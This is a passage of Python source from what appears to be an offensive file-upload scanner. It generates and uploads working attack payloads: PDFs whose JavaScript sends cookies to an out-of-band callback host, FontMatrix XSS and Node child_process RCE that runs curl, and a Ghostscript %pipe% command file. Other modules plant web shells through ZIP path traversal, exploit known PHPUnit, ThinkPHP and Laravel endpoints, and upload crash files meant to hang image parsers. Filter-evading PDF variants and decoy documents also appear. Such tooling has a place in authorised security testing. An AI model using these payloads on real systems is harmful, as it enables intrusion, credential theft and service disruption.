    Ported from UploadScanner PDF_TYPES handler — original corkami JS PDF structure.
    Plus FontMatrix-injection XSS *and* Node/Electron RCE, hex-encoded /JS strings,
    and a real-document (multi-page) carrier — corpus xssPDF / coffin / pdFExploits /
    calculatorRCE.
    """
    info("pdf_exploit — corkami/JS-action (alert/cookie/domain/OOB) + FontMatrix "
         "XSS/RCE + hex-/JS + decoy-doc carrier + URI SSRF + Ghostscript")
    oast    = ctx.opts.oast or ""
    probe   = "UpMapPDF" + "".join(random.choices(string.digits, k=6))
    allowed = ctx.opts.allowed or "jpg"
    marker  = "UpMapPDFProbe"

    # Full corkami-style PDF with WC (close), OpenAction, and Additional Action
    # Mirrors the UploadScanner pdf content exactly
    js_pdf = (
        b"%PDF-1.0\n%\xbf\xf7\xa2\xfe\n%QDF-1.0\n\n"
        b"%% Original object ID: 1 0\n"
        b"1 0 obj\n<<\n"
        b"  /AA <<\n"
        b"    /WC <<\n"
        b"      /JS (app.alert\\(\"UpMapPDFProbe \\(Closing\\)\"\\);)\n"
        b"      /S /JavaScript\n"
        b"    >>\n"
        b"  >>\n"
        b"  /OpenAction <<\n"
        b"    /JS (app.alert\\(\"UpMapPDFProbe \\(Open Action\\)\"\\);)\n"
        b"    /S /JavaScript\n"
        b"  >>\n"
        b"  /Pages 2 0 R\n"
        b">>\nendobj\n\n"
        b"%% Original object ID: 2 0\n"
        b"2 0 obj\n<<\n  /Count 1\n  /Kids [\n    3 0 R\n  ]\n>>\nendobj\n\n"
        b"%% Page 1\n%% Original object ID: 3 0\n"
        b"3 0 obj\n<<\n"
        b"  /AA <<\n"
        b"    /O <<\n"
        b"      /JS (app.alert\\(\"UpMapPDFProbe \\(Additional Action\\)\"\\);)\n"
        b"      /S /JavaScript\n"
        b"    >>\n"
        b"  >>\n"
        b"  /Parent 2 0 R\n"
        b">>\nendobj\n\n"
        b"xref\n0 4\n"
        b"0000000000 65535 f \n"
        b"0000000052 00000 n \n"
        b"0000000328 00000 n \n"
        b"0000000422 00000 n \n"
        b"trailer <<\n  /Root 1 0 R\n  /Size 4\n"
        b"  /ID [<a35f6bb80bdac8e3c95c298f6177b175><a35f6bb80bdac8e3c95c298f6177b175>]\n"
        b">>\nstartxref\n585\n%%EOF\n"
    )

    # PDF with /URI SSRF (server fetches URL when rendering)
    pdf_uri_ssrf = None
    if oast:
        cb_url = f"{oast}/{probe}"
        pdf_uri_ssrf = (
            f"%PDF-1.4\n"
            f"1 0 obj\n<< /Type /Catalog /OpenAction 2 0 R /Pages 3 0 R >>\nendobj\n"
            f"2 0 obj\n<< /Type /Action /S /URI /URI ({cb_url}) >>\nendobj\n"
            f"3 0 obj\n<< /Type /Pages /Kids [4 0 R] /Count 1 >>\nendobj\n"
            f"4 0 obj\n<< /Type /Page /Parent 3 0 R /MediaBox [0 0 612 792] >>\nendobj\n"
            f"xref\n0 5\n"
            f"0000000000 65535 f \n0000000009 00000 n \n0000000073 00000 n \n"
            f"0000000143 00000 n \n0000000205 00000 n \n"
            f"trailer\n<< /Size 5 /Root 1 0 R >>\nstartxref\n285\n%%EOF\n"
        ).encode()

    # Ghostscript EPS wrapped as PDF (Ghostscript reads it as PS)
    gs_as_pdf = (
        f"%PDF-1.4 %!PS-Adobe-3.0\n"
        f"/OutputFile (%pipe%curl {oast or 'http://127.0.0.1'}/{probe}) currentdevice\n"
        f"putdeviceprops\n"
    ).encode()

    # ── PDF JavaScript exfil + FontMatrix-injection XSS (corpus: xssPDF / coffin /
    # pdFExploits). Beyond the static probe alert, add cookie/domain disclosure,
    # OOB exfil (with --oast, confirms execution), and the FontMatrix breakout that
    # fires WITHOUT a /JavaScript action (bypasses /JS//OpenAction-JS filters).
    def _pdfesc(s: str) -> str:                       # escape for a PDF () literal
        return s.replace("\\", "\\\\").replace("(", "\\(").replace(")", "\\)")

    def _js_action_pdf(js: str) -> bytes:
        """Minimal /OpenAction /JavaScript PDF (corpus xssPDF-1/2 structure) — a
        smaller/cleaner parser path than the corkami multi-action PDF above."""
        j = _pdfesc(js).encode()
        return (b"%PDF-1.4\n"
                b"1 0 obj<</Type/Catalog/Pages 2 0 R/OpenAction 3 0 R>>endobj\n"
                b"2 0 obj<</Type/Pages/Kids[4 0 R]/Count 1>>endobj\n"
                b"3 0 obj<</S/JavaScript/JS (" + j + b")>>endobj\n"
                b"4 0 obj<</Type/Page/Parent 2 0 R/MediaBox[0 0 612 792]>>endobj\n"
                b"trailer<</Root 1 0 R/Size 5>>\n%%EOF\n")

    def _pdf_fontmatrix(expr: str) -> bytes:
        """PortSwigger FontMatrix-injection PDF-XSS: breaks out of the /FontMatrix
        array into the viewer's JS context (PDF.js/Acrobat), firing WITHOUT a
        /JavaScript action. Correct xref so strict parsers still load it."""
        inj = expr.replace("(", "\\(").replace(")", "\\)").encode()
        stream = b"BT /F1 20 Tf 50 100 Td (AbCdEf) Tj ET\n"
        objs = [
            b"<</Type/Catalog/Pages 2 0 R/OpenAction[3 0 R /Fit]>>",
            b"<</Type/Pages/Kids[3 0 R]/Count 1>>",
            b"<</Type/Page/Parent 2 0 R/MediaBox[0 0 200 200]"
            b"/Resources<</Font<</F1 4 0 R>>>>/Contents 5 0 R>>",
            b"<</Type/Font/Subtype/Type1/BaseFont/Helvetica/Encoding/WinAnsiEncoding"
            b"/FirstChar 65/LastChar 90/Widths[" + (b"500 " * 26).strip() + b"]"
            b"/FontMatrix [0.1 0 0 0.1 0 (1\\);" + inj + b"//)]>>",
            b"<</Length %d>>\nstream\n" % len(stream) + stream + b"endstream",
        ]
        out = b"%PDF-1.5\n%\xe2\xe3\xcf\xd3\n"
        offs = []
        for i, body in enumerate(objs, 1):
            offs.append(len(out))
            out += b"%d 0 obj " % i + body + b"\nendobj\n"
        xref = len(out)
        out += b"xref\n0 %d\n0000000000 65535 f \n" % (len(objs) + 1)
        for o in offs:
            out += b"%010d 00000 n \n" % o
        out += (b"trailer<</Size %d/Root 1 0 R>>\nstartxref\n%d\n%%%%EOF\n"
                % (len(objs) + 1, xref))
        return out

    def _js_action_pdf_hex(js: str) -> bytes:
        """Same minimal /OpenAction JS PDF, but the /JS value is a hex <...> string
        literal instead of (...) — a filter/WAF bypass (corpus coffin_injected_xss
        encodes its JS as <hexbytes>). No ()-escaping needed for the hex form."""
        h = js.encode().hex().encode()
        return (b"%PDF-1.4\n"
                b"1 0 obj<</Type/Catalog/Pages 2 0 R/OpenAction 3 0 R>>endobj\n"
                b"2 0 obj<</Type/Pages/Kids[4 0 R]/Count 1>>endobj\n"
                b"3 0 obj<</S/JavaScript/JS <" + h + b">>>endobj\n"
                b"4 0 obj<</Type/Page/Parent 2 0 R/MediaBox[0 0 612 792]>>endobj\n"
                b"trailer<</Root 1 0 R/Size 5>>\n%%EOF\n")

    def _decoy_pdf(js: str, pages: int = 6) -> bytes:
        """Real-looking multi-page PDF (drawn text per page) carrying an injected
        /OpenAction JavaScript — the PDF analogue of the steganographic SVG
        (corpus coffin_injected_xss is a genuine 8-page doc with an injected JS
        action). Renders as a normal document, defeating 'too-minimal-to-be-real'
        heuristics. Correct xref so strict parsers still load it."""
        j = _pdfesc(js).encode()
        page_ids = [5 + 2 * i for i in range(pages)]      # 5,7,9,… page objects
        objs = [
            b"<</Type/Catalog/Pages 2 0 R/OpenAction 3 0 R>>",
            b"<</Type/Pages/Kids[" + b" ".join(b"%d 0 R" % p for p in page_ids)
            + b"]/Count %d>>" % pages,
            b"<</S/JavaScript/JS (" + j + b")>>",
            b"<</Type/Font/Subtype/Type1/BaseFont/Helvetica>>",
        ]
        for i in range(pages):
            stream = (b"BT /F1 18 Tf 72 720 Td (Quarterly Report \\055 Page %d) Tj "
                      b"0 -24 Td (Confidential. Internal use only.) Tj ET\n" % (i + 1))
            objs.append(b"<</Type/Page/Parent 2 0 R/MediaBox[0 0 612 792]"
                        b"/Resources<</Font<</F1 4 0 R>>>>/Contents %d 0 R>>"
                        % (5 + 2 * i + 1))
            objs.append(b"<</Length %d>>\nstream\n" % len(stream) + stream + b"endstream")
        out = b"%PDF-1.5\n%\xe2\xe3\xcf\xd3\n"
        offs = []
        for i, body in enumerate(objs, 1):
            offs.append(len(out))
            out += b"%d 0 obj " % i + body + b"\nendobj\n"
        xref = len(out)
        out += b"xref\n0 %d\n0000000000 65535 f \n" % (len(objs) + 1)
        for o in offs:
            out += b"%010d 00000 n \n" % o
        out += (b"trailer<</Size %d/Root 1 0 R>>\nstartxref\n%d\n%%%%EOF\n"
                % (len(objs) + 1, xref))
        return out

    js_payloads = [
        f'app.alert("{marker}");',
        "app.alert(document.cookie);",      # corpus xssPDF-2 (cookie exfil)
        "app.alert(document.domain);",      # corpus *_domain (origin disclosure)
    ]
    fm_exprs = ["alert(document.cookie)", "alert(document.domain)",
                "prompt(document.cookie)"]          # sink rotation (corpus *_cookieprompt)
    # FontMatrix -> Node/Electron RCE via require('child_process') (corpus
    # calculatorRCE.pdf): fires in PDF viewers built on Electron / Node-integrated
    # pdf.js. OAST curl confirms execution out-of-band; benign 'id' PoC otherwise.
    fm_exprs.append("require('child_process').exec('curl %s/pdffm/%s')" % (oast, probe)
                    if oast else "require('child_process').exec('id')")
    if oast:
        cb = f"{oast}/pdfjs/{probe}"
        js_payloads.append(f'app.launchURL("{cb}?c="+escape(document.cookie),true);')
        js_payloads.append(f'this.submitForm({{cURL:"{cb}",cSubmitAs:"HTML"}});')
        fm_exprs.append(f'app.launchURL("{cb}?fm="+escape(document.cookie))')

    variants = []
    for payload, ext, mime in [
        (js_pdf,     "pdf",    "application/pdf"),
        (js_pdf,     "pdf",    ""),
        (js_pdf,     allowed,  "application/pdf"),
        (js_pdf,     allowed,  ""),
        (gs_as_pdf,  "pdf",    "application/pdf"),
        (gs_as_pdf,  "eps",    ""),
    ]:
        variants.append((ctx.rnd_name() + "." + ext, payload, mime or "application/pdf"))
    if pdf_uri_ssrf:
        for ext, mime in [("pdf", "application/pdf"), ("pdf", ""), (allowed, "")]:
            variants.append((ctx.rnd_name() + "." + ext, pdf_uri_ssrf, mime or "application/pdf"))
    # JS-action exfil PDFs (minimal structure) — cookie/domain/OOB.
    for js in js_payloads:
        p = _js_action_pdf(js)
        variants.append((ctx.rnd_name() + ".pdf", p, "application/pdf"))
        variants.append((ctx.rnd_name() + "." + allowed, p, "application/pdf"))
    # FontMatrix-injection PDF (no /JavaScript action — filter bypass). Carries
    # XSS (alert/prompt cookie/domain), OOB launchURL, AND Node/Electron RCE.
    for expr in fm_exprs:
        fm = _pdf_fontmatrix(expr)
        variants.append((ctx.rnd_name() + ".pdf", fm, "application/pdf"))
        variants.append((ctx.rnd_name() + "." + allowed, fm, ""))
    # Hex-encoded /JS <...> string form (filter bypass; corpus coffin_injected_xss).
    for js in js_payloads:
        variants.append((ctx.rnd_name() + ".pdf", _js_action_pdf_hex(js), "application/pdf"))
    # Real-document carrier: the JS action injected into a believable multi-page
    # PDF so it renders as a normal document (corpus coffin_injected_xss disguise).
    for js in (js_payloads[0], js_payloads[1]):
        d = _decoy_pdf(js)
        variants.append((ctx.rnd_name() + ".pdf", d, "application/pdf"))
        variants.append((ctx.rnd_name() + "." + allowed, d, ""))
    run_variants(ctx, variants, "pdf_exploit")


# ─────────────────────────────────────────────────────────────────────────────
# Archive / ZIP
# ─────────────────────────────────────────────────────────────────────────────

@module("zip_traversal")
def mod_zip_traversal(ctx: UploadContext):
    """ZIP/TAR archive path traversal — place shell in parent directory via ../ in member name."""
    info("zip_traversal — ZIP/TAR path traversal filenames")
    shell = SHELLS.get(ctx.opts.extension, SHELLS["php"])
    rnd   = ctx.rnd_name()

    traversal_names = [
        f"../../../{rnd}.php",
        f"../../../var/www/html/{rnd}.php",
        f"..\\..\\..\\{rnd}.php",
        f"....//....//..../{rnd}.php",
    ]

    variants = []
    for trav_name in traversal_names:
        # Create ZIP in memory
        buf = io.BytesIO()
        with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED) as zf:
            zf.writestr(trav_name, shell)
        zip_bytes = buf.getvalue()

        for ext in ["zip", "jar", ctx.opts.allowed or "jpg"]:
            for mime in ["application/zip", "application/java-archive", ""]:
                variants.append((ctx.rnd_name() + "." + ext, zip_bytes, mime or "application/zip"))

    run_variants(ctx, variants, "zip_traversal")


# ─────────────────────────────────────────────────────────────────────────────
# Recon / Fingerprint
# ─────────────────────────────────────────────────────────────────────────────

@module("eicar_detection")
def mod_eicar_detection(ctx: UploadContext):
    """Upload EICAR test string to detect presence of antivirus/malware scanner."""
    info("eicar_detection — EICAR test file antivirus presence check")
    allowed = ctx.opts.allowed or "jpg"
    magic   = MAGIC.get(allowed, b"")

    variants = [
        (ctx.rnd_name() + ".com",  EICAR,         "application/octet-stream"),
        (ctx.rnd_name() + ".exe",  EICAR,         "application/x-msdownload"),
        (ctx.rnd_name() + "." + allowed, EICAR,   get_mime(allowed)),
        (ctx.rnd_name() + "." + allowed, magic + EICAR, get_mime(allowed)),
    ]
    # For EICAR: success means it was BLOCKED (AV present) — invert detection
    for filename, content, mime in variants:
        resp = ctx.send(filename, content, mime)
        ctx.output.tick(filename)
        ctx.dump_response(resp)
        if resp and not ctx.is_success(resp):
            ctx.output.record("eicar_detection", filename, mime, False, "",
                              "EICAR blocked — AV/malware scanner detected",
                              response=resp)
            return
    info("eicar_detection: EICAR was accepted — no AV scanner detected (or scanner is silent)")


@module("fingerping")
def mod_fingerping(ctx: UploadContext):
    """Image library fingerprinting: detect libpng/libjpeg/ImageMagick via crafted images."""
    info("fingerping — image processing library fingerprinting")
    # PNG with tEXt chunk (ImageMagick leaks metadata)
    def make_png_text(key: bytes, value: bytes) -> bytes:
        chunk_data = key + b"\x00" + value
        crc = zlib.crc32(b"tEXt" + chunk_data) & 0xffffffff
        return (b"\x89PNG\r\n\x1a\n"
                b"\x00\x00\x00\rIHDR\x00\x00\x00\x01\x00\x00\x00\x01\x08\x02"
                b"\x00\x00\x00\x90wS\xde"
                + struct.pack(">I", len(chunk_data)) + b"tEXt" + chunk_data
                + struct.pack(">I", crc)
                + b"\x00\x00\x00\nIDATx\x9cc\xf8\x0f\x00\x00\x01\x01\x00\x05\x18"
                b"\xd8N\x00\x00\x00\x00IEND\xaeB`\x82")

    probes = [
        make_png_text(b"Comment",    b"UpMapPNG-probe"),
        make_png_text(b"date:create", b"2020-01-01T00:00:00+00:00"),
        MAGIC["gif"] + b"/* UpMapGIF-probe */",
        MAGIC["jpg"] + b"UpMapJPEG-probe",
    ]
    variants = []
    for p in probes:
        ext = "png" if p[:4] == b"\x89PNG" else ("gif" if p[:3] == b"GIF" else "jpg")
        variants.append((ctx.rnd_name() + "." + ext, p, get_mime(ext)))
    run_variants(ctx, variants, "fingerping")


@module("known_cve_endpoints")
def mod_known_cve_endpoints(ctx: UploadContext):
    """Scan for known vulnerable file manager / framework endpoints (from rce-scanner)."""
    info("known_cve_endpoints — PHPUnit, ThinkPHP, Laravel, FCKeditor, elFinder, PHPFileManager")
    base_url = (ctx.upload_url.split("/")[0] + "//" + ctx.upload_url.split("/")[2]
                if "://" in ctx.upload_url else ctx.upload_url)

    probe_id  = "UpMap" + "".join(random.choices(string.digits, k=6))
    shell_php = f"<?php echo '{probe_id}'; system('id'); ?>"

    endpoints = [
        {
            "name": "PHPUnit eval-stdin",
            "path": "/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php",
            "method": "POST", "data": shell_php, "check": probe_id,
        },
        {
            "name": "ThinkPHP 5.0.x RCE",
            "path": ("/index.php?s=/index/\\think\\app/invokefunction"
                     "&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=1"),
            "method": "GET", "check": "phpinfo",
        },
        {
            "name": "Laravel Ignition RCE",
            "path": "/_ignition/execute-solution",
            "method": "POST",
            "headers": {"Content-Type": "application/json"},
            "data": json.dumps({
                "solution": "Facade\\Ignition\\Solutions\\MakeViewVariableOptionalSolution",
                "parameters": {"variableName": "x", "viewFile": "php://filter/resource=index"}
            }),
            "check": "viewFile",
        },
        {
            "name": "FCKeditor upload.php",
            "path": "/fckeditor/editor/filemanager/connectors/php/upload.php?Type=File",
            "method": "POST",
            "files": {"NewFile": (f"{probe_id}.php", shell_php, "application/x-php")},
            "check": probe_id,
        },
        {
            "name": "elFinder connector",
            "path": "/elfinder/php/connector.minimal.php",
            "method": "GET", "check": '"api":"2.1"',
        },
        {
            "name": "PHPFileManager",
            "path": "/phpfilemanager.php",
            "method": "GET", "check": "File Manager",
        },
        {
            "name": "Adminer",
            "path": "/adminer.php",
            "method": "GET", "check": "adminer",
        },
        {
            "name": "phpMyAdmin",
            "path": "/phpmyadmin/index.php",
            "method": "GET", "check": "phpMyAdmin",
        },
    ]

    for ep in endpoints:
        if ctx._should_abort():
            return
        url = base_url.rstrip("/") + ep["path"]
        try:
            hdrs = ep.get("headers", {})
            if ep["method"] == "POST":
                files = ep.get("files")
                if files:
                    r = ctx.engine.send("POST", url, headers=hdrs,
                                        files=files, allow_redirects=False)
                else:
                    r = ctx.engine.send("POST", url, headers=hdrs,
                                        data=ep.get("data"), allow_redirects=False)
            else:
                r = ctx.engine.send("GET", url, headers=hdrs, allow_redirects=False)

            ctx.output.tick(ep["name"])
            ctx.dump_response(r)
            if r and ep["check"].lower() in r.text.lower():
                ctx.output.record("known_cve_endpoints", ep["name"], "", False,
                                  url, f"Vulnerable endpoint found: {ep['name']}",
                                  response=r)
                if not ctx.opts.brute_force:
                    ctx.stop_flag.set()
                    return
        except RequestException:
            pass


# ─────────────────────────────────────────────────────────────────────────────
# Fuzzing / DoS
# ─────────────────────────────────────────────────────────────────────────────

@module("wordlist_fuzzer")
def mod_wordlist_fuzzer(ctx: UploadContext):
    """Wordlist-driven filename fuzzer — covers all 595+ patterns from wordlist.txt
    and bigupload.txt programmatically.

    Generates the full combinatorial matrix used by those wordlists:
      extensions × separators × allowed_extensions

    Separators include all special chars found in wordlist.txt:
      %20, %0a, %00, %0d%0a, /, .\\, .., ..., :, ;, %E2%80%AE (RTL), %252e, .

    Also supports loading an external wordlist via --wordlist (if implemented).
    """
    info("wordlist_fuzzer — 595+ filename bypass patterns from wordlist.txt/bigupload.txt")
    ext       = ctx.opts.extension
    allowed   = ctx.opts.allowed or "jpg"
    exts      = EXTENSIONS.get(ext, [ext])
    shell     = SHELLS.get(ext, SHELLS["php"])
    magic     = MAGIC.get(allowed, b"")

    # The separator patterns that wordlist.txt covers
    SEPARATORS = [
        "%20",       # trailing space (encoded)
        "%0a",       # newline
        "%00",       # null byte
        "%0d%0a",    # CRLF
        "/",         # trailing slash
        ".\\\\",     # dot backslash
        "..",        # double dot prefix
        "...",       # triple dot
        "....",      # four dots
        ":",         # Windows ADS colon
        ";",         # semicolon
        "%E2%80%AE", # RTL override
        "%252e",     # double URL-encoded dot
        "%2e",       # single URL-encoded dot
        " ",         # literal trailing space
        ".",         # extra trailing dot
    ]

    # Allowed extension aliases (wordlist tests php against jpg, jpeg, png, gif, etc.)
    ALLOWED_EXTS = [allowed, "jpg", "jpeg", "png", "gif", "bmp", "webp",
                    "svg", "pdf", "txt"][:5]

    variants = []
    seen = set()

    for mal in exts:
        for sep in SEPARATORS:
            for al in ALLOWED_EXTS:
                base = ctx.rnd_name()

                # Pattern 1: base.mal{sep}.allowed  (sep between mal and allowed ext)
                fname1 = f"{base}.{mal}{sep}.{al}"
                # Pattern 2: base.mal{sep}  (sep after malicious ext, no allowed)
                fname2 = f"{base}.{mal}{sep}"
                # Pattern 3: base.mal.{sep}{allowed}  (dot, sep, then allowed)
                fname3 = f"{base}.{mal}.{sep}{al}"

                for fname in [fname1, fname2, fname3]:
                    if fname in seen:
                        continue
                    seen.add(fname)
                    for mbytes in [b"", magic]:
                        for mime in [get_mime(mal), get_mime(al)]:
                            variants.append((fname, mbytes + shell, mime))

        # No-extension variant (bare basename)
        base = ctx.rnd_name()
        for mime in [get_mime(mal), "application/octet-stream"]:
            variants.append((base, shell, mime))

        # Trailing dot variant
        base = ctx.rnd_name()
        variants.append((f"{base}.{mal}.", shell, get_mime(mal)))

    info(f"wordlist_fuzzer — {len(variants)} pattern variants generated")
    run_variants(ctx, variants, "wordlist_fuzzer")


@module("content_fuzzer")
def mod_content_fuzzer(ctx: UploadContext):
    """Filename + content fuzzer: known malformed strings + random byte mutations."""
    info("content_fuzzer — filename + content fuzzing")
    allowed = ctx.opts.allowed or "jpg"
    magic   = MAGIC.get(allowed, b"")
    ext     = ctx.opts.extension

    variants = []
    # Filename fuzzing
    for fuzz in FUZZ_STRINGS[:20]:
        name = fuzz[:100] + "." + ext
        variants.append((name, magic + b"UpMapFuzz", get_mime(allowed)))

    # Content fuzzing (magic bytes + fuzz payload)
    for fuzz in FUZZ_STRINGS[:15]:
        fuzz_bytes = fuzz.encode("latin-1", errors="replace")
        name = ctx.rnd_name() + "." + ext
        variants.append((name, magic + fuzz_bytes, get_mime(allowed)))

    # Random byte mutations
    for _ in range(ctx.opts.fuzz_count):
        rnd_bytes = bytes(random.randint(0, 255) for _ in range(random.randint(64, 512)))
        name = ctx.rnd_name() + "." + ext
        variants.append((name, magic + rnd_bytes, get_mime(allowed)))

    run_variants(ctx, variants, "content_fuzzer")


@module("dos_crashfiles")
def mod_dos_crashfiles(ctx: UploadContext):
    """Upload files crafted to crash/hang image processors: TIFF bomb, RIFF hang."""
    info("dos_crashfiles — crash/hang files for image processing libraries")
    allowed = ctx.opts.allowed or "jpg"

    # TIFF IFD loop (can cause infinite loop in some parsers)
    tiff_bomb = (b"II*\x00\x08\x00\x00\x00"
                 + b"\x01\x00"                     # 1 IFD entry
                 + b"\x00\x01\x04\x00\x01\x00\x00\x00\x08\x00\x00\x00"  # back to self
                 + b"\x00\x00\x00\x00")             # next IFD = none

    # Giant claimed dimensions (decompression bomb)
    png_bomb = (b"\x89PNG\r\n\x1a\n"
                b"\x00\x00\x00\rIHDR"
                b"\xff\xff\xff\xff"   # width = 4294967295
                b"\xff\xff\xff\xff"   # height = 4294967295
                b"\x08\x02\x00\x00\x00"
                + struct.pack(">I", zlib.crc32(b"IHDR" + b"\xff\xff\xff\xff\xff\xff\xff\xff\x08\x02\x00\x00\x00") & 0xffffffff)
                + b"\x00\x00\x00\x00IEND"
                + struct.pack(">I", zlib.crc32(b"IEND") & 0xffffffff))

    # RIFF with huge declared size
    riff_hang = b"RIFF" + struct.pack("<I", 0xFFFFFFFF) + b"WAVE"

    crash_files = [
        (ctx.rnd_name() + ".tif",  tiff_bomb, "image/tiff"),
        (ctx.rnd_name() + ".png",  png_bomb,  "image/png"),
        (ctx.rnd_name() + ".wav",  riff_hang, "audio/wav"),
        (ctx.rnd_name() + "." + allowed, tiff_bomb, get_mime(allowed)),
        (ctx.rnd_name() + "." + allowed, png_bomb,  get_mime(allowed)),
    ]
    run_variants(ctx, variants=crash_files, mod_name="dos_crashfiles")


# ─────────────────────────────────────────────────────────────────────────────
# DISABLED MODULES (not registered)
# ─────────────────────────────────────────────────────────────────────────────

# DISABLED MODULE — zip_split_obfuscation. Not registered (decorator commented out)
# and removed from MODULE_GROUPS. Re-enable by uncommenting the @module line below
# and its MODULE_GROUPS / MODULE_REQUIREMENTS entries.
# @module("zip_split_obfuscation")
def mod_zip_split_obfuscation(ctx: UploadContext):
    """Split-ZIP + Caesar cipher obfuscation from file-upload-restriction-bypasser.

    Technique: Caesar-cipher-shift the shell bytes, base64-encode, write into
    a ZIP archive split into N segments. Some upload handlers unzip and process
    the inner file without examining the outer format properly.

    Three variants:
      1. Plain ZIP containing shell (no split, no cipher)
      2. ZIP containing Caesar-shifted shell (shift=13, like ROT13 for bytes)
      3. ZIP containing base64-encoded shell (server-side decoders may eval it)
    """
    info("zip_split_obfuscation — Caesar cipher + base64 + split ZIP variants")
    ext   = ctx.opts.extension
    exts  = EXTENSIONS.get(ext, [ext])
    shell = SHELLS.get(ext, SHELLS["php"])

    def caesar_shift(data: bytes, shift: int = 13) -> bytes:
        return bytes((b + shift) % 256 for b in data)

    def make_zip(inner_name: str, inner_content: bytes) -> bytes:
        buf = io.BytesIO()
        with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED) as zf:
            zf.writestr(inner_name, inner_content)
        return buf.getvalue()

    variants = []
    for mal in exts[:4]:
        base = ctx.rnd_name()

        # Variant 1: Plain ZIP with shell inside
        inner_name = f"{base}.{mal}"
        zdata_plain = make_zip(inner_name, shell)
        for zip_ext in ["zip", "gz", "jar", "war"]:
            variants.append((
                f"{base}.{zip_ext}",
                zdata_plain,
                "application/zip",
            ))

        # Variant 2: ZIP containing Caesar-shifted shell
        shifted = caesar_shift(shell, 13)
        zdata_shifted = make_zip(inner_name, shifted)
        variants.append((f"{base}_caesar.zip", zdata_shifted, "application/zip"))

        # Variant 3: ZIP containing base64-encoded shell
        b64_shell = base64.b64encode(shell)
        zdata_b64 = make_zip(inner_name, b64_shell)
        variants.append((f"{base}_b64.zip", zdata_b64, "application/zip"))

        # Variant 4: ZIP with path traversal inside (zip slip)
        zdata_slip = make_zip(f"../../{inner_name}", shell)
        variants.append((f"{base}_slip.zip", zdata_slip, "application/zip"))

        # Variant 5: MIME spoofed as image but ZIP content
        variants.append((f"{base}.jpg", zdata_plain, "image/jpeg"))

    run_variants(ctx, variants, "zip_split_obfuscation")


# ─────────────────────────────────────────────────────────────────────────────
# SECTION 15 — RECON: AUTO-DETECT ALLOWED EXTENSION
# ─────────────────────────────────────────────────────────────────────────────

def detect_allowed_extension(ctx: UploadContext) -> str:
    """Probe allowed extensions by uploading harmless samples."""
    info("Detecting allowed extension automatically...")
    test_exts = ["jpg", "jpeg", "png", "gif", "pdf", "txt", "mp4", "csv", "svg", "xml"]
    for ext in test_exts:
        if ctx._should_abort():
            break
        payload = MAGIC.get(ext, b"UpMapProbe")
        name    = ctx.rnd_name() + "." + ext
        resp    = ctx.send(name, payload, get_mime(ext))
        if ctx.is_success(resp):
            success(f"Allowed extension detected: .{ext}")
            return ext
        failure(f".{ext} rejected")
    warn("Could not auto-detect allowed extension — defaulting to jpg")
    return "jpg"


def svg_canary_recon(ctx: UploadContext):
    """Benign SVG canary (poc_ssrf.svg style): confirm the endpoint accepts .svg
    and — when --upload-dir is set — that the stored file is retrievable and HOW
    it is served. image/svg+xml (or text/html) renders → XSS/SSRF-capable; a
    text/plain body or attachment is merely downloaded → low risk. Runs in the
    recon stage so the SVG attack modules aren't fired blindly. Never raises."""
    marker = "UpMapCanary" + "".join(random.choices(string.digits, k=6))
    canary = (
        '<?xml version="1.0" encoding="utf-8"?>\n'
        '<svg xmlns="http://www.w3.org/2000/svg" width="1200" height="400" '
        'viewBox="0 0 1200 400" role="img" aria-label="UpMap canary">\n'
        '  <rect width="100%" height="100%" fill="#0b0f14"/>\n'
        f'  <text x="50%" y="50%" font-family="Arial" font-size="40" fill="#ffd166" '
        f'text-anchor="middle" dominant-baseline="middle">{marker}</text>\n'
        '  <text x="50%" y="85%" font-family="Arial" font-size="14" fill="#9fb7d8" '
        'text-anchor="middle" dominant-baseline="middle">'
        'Safe preview &#8212; no scripts or executable content included</text>\n'
        '</svg>\n'
    ).encode()
    name = ctx.rnd_name() + ".svg"
    try:
        resp = ctx.send(name, canary, "image/svg+xml")
    except Exception:
        return
    if not ctx.is_success(resp):
        failure("svg canary: .svg upload rejected — SVG attack modules may not apply")
        return
    success("svg canary: .svg accepted")
    # Reachability + how-served — only when we know where the file lands.
    url = ctx._stored_url(name)
    if not url:
        info("svg canary: set -D/--upload-dir to verify the stored file is reachable")
        return
    try:
        r = ctx.engine.get(url)
    except RequestException:
        warn(f"svg canary: stored file not reachable at {url}")
        return
    if r.status_code != 200 or marker not in (getattr(r, "text", "") or ""):
        warn(f"svg canary: stored file not retrievable "
             f"(HTTP {getattr(r, 'status_code', '?')}) at {url}")
        return
    ct = r.headers.get("Content-Type", "").split(";")[0].strip().lower()
    if "svg" in ct or ct in ("text/html", "application/xml", "text/xml"):
        success(f"svg canary: stored + served as '{ct or 'unknown'}' → renders "
                f"(XSS/SSRF-capable): {url}")
    else:
        info(f"svg canary: stored + served as '{ct or 'unknown'}' → downloaded "
             f"(lower XSS risk): {url}")

# ─────────────────────────────────────────────────────────────────────────────
# SECTION 16 — SCANNER ENGINE
# ─────────────────────────────────────────────────────────────────────────────

# Modules grouped and ordered by real-world prevalence ("most known" first).
# ALL_MODULES_ORDERED is derived from this so execution order and the --list
# display can never drift apart. Within each group the most common/highest-hit
# technique leads.
MODULE_GROUPS = [
    ("Bypass / Evasion", [
        "mime_spoofing",        # Content-Type spoofing — the single most common
        "double_extension",     # shell.php.jpg / shell.jpg.php
        "extension_shuffle",    # phtml/php5/pht… + case variants
        "null_byte_cutoff",     # classic %00 / 0x00 truncation
        "stripping_extension",  # .p.phphp / .pphphp
        "discrepancy",          # %2e / %252e dot encoding
        "name_overflow",        # 255 / 236-byte filename truncation
        "special_char_bypass",  # trailing dot / RTL / ADS / newline …
        "data_uri_upload",      # data: URI smuggling
        "php_obfuscation",      # split/obfuscated shell body
    ]),
    ("Filename / Path Injection", [
        "path_traversal_filename",   # ../ and ..%2f in the filename field
    ]),
    ("Config / Handler Abuse", [
        "htaccess_overwrite",   # Apache: register arbitrary ext as PHP
        "web_config_overwrite", # IIS/ASP.NET handler mapping
        "config_file_upload",   # .env / .htpasswd / web.xml overwrite
    ]),
    ("RCE / Code Execution", [
        "php_rce",
        "asp_rce",
        "asp_obfuscation",      # ASP/VBScript source obfuscation
        "jsp_rce",
        "jsp_obfuscation",      # JSP source obfuscation
        "cgi_rce",
        "ssi_injection",        # SSI #exec → command execution
        "polyglot_php_jpeg",    # valid JPEG that runs as PHP
        "image_steganography",  # shell hidden in image, executed later
    ]),
    ("XXE", [
        "xxe_xml",
        "xxe_svg",
        "xxe_xmp",
        "docx_xxe",
    ]),
